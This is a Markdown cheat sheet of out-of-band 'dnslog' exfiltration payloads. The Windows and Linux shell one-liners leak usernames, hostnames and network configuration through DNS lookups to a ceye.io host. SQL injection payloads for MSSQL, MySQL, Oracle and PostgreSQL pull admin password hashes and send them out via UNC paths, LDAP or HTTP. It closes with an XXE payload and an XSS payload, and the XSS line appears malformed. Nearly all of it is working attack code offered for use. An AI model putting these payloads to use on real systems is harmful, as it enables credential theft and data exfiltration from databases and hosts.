# Dnslog

## Windows
```bash
ping %USERNAME%.xxxxx.ceye.io

cmd /v /c "hostname > temp && certutil -encode temp temp2 && findstr /L /V "CERTIFICATE" temp2 > temp3 && set /p MYVAR=<temp3 && set FINAL=!MYVAR!.xxxxx.ceye.io && nslookup !FINAL!"

ipconfig > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.xxxxx.ceye.io';$j += 1; nslookup $fin }
```

## Linux
```bash
ping `whoami`.xxxxx.ceye.io

var=11111 && for b in $(ifconfig|xxd -p ); do var=$((var+1)) && dig $var.$b.xxxxx.ceye.io; done

var=11111 && for i in $(ifconfig|base64|awk '{gsub(/.{50}/,"&\n")}1'); do var=$((var+1)) && nslookup $var.$i.xxxxx.ceye.io; done
```

## mssql
```sql
DECLARE @host varchar(1024);
SELECT @host=(SELECT TOP 1
master.dbo.fn_varbintohexstr(password_hash)
FROM sys.sql_logins WHERE name='sa')
+'.ip.port.<你的>.ceye.io';
EXEC('master..xp_dirtree
"\\'+@host+'\foobar$"');
```

## mysql
```sql
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.<你的>.ceye.io\\abc'));
```

## Oracle
```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.<你的>.ceye.io');
SELECT UTL_HTTP.REQUEST('http://ip.port.<你的>.ceye.io/oracle') FROM DUAL;
SELECT HTTPURITYPE('http://ip.port.<你的>.ceye.io/oracle').GETCLOB() FROM DUAL;
SELECT DBMS_LDAP.INIT(('oracle.ip.port.<你的>.ceye.io',80) FROM DUAL;
SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.<你的>.ceye.io',80) FROM DUAL;
```

## PostgreSQL
```sql
DROP TABLE IF EXISTS table_output;
CREATE TABLE table_output(content text);
CREATE OR REPLACE FUNCTION temp_function()
RETURNS VOID AS $
DECLARE exec_cmd TEXT;
DECLARE query_result TEXT;
BEGIN
SELECT INTO query_result (SELECT passwd
FROM pg_shadow WHERE usename='postgres');
exec_cmd := E'COPY table_output(content)
FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.<你的>.ceye.io\\\\foobar.txt\'';
EXECUTE exec_cmd;
END;
$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT temp_function();
```

## XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://ip.port.<你的>.ceye.io/xxe_test">
%remote;]>
<root/>
```

## XSS
```html
<img src=x onerror=http://<你的>.ceye.io>
```
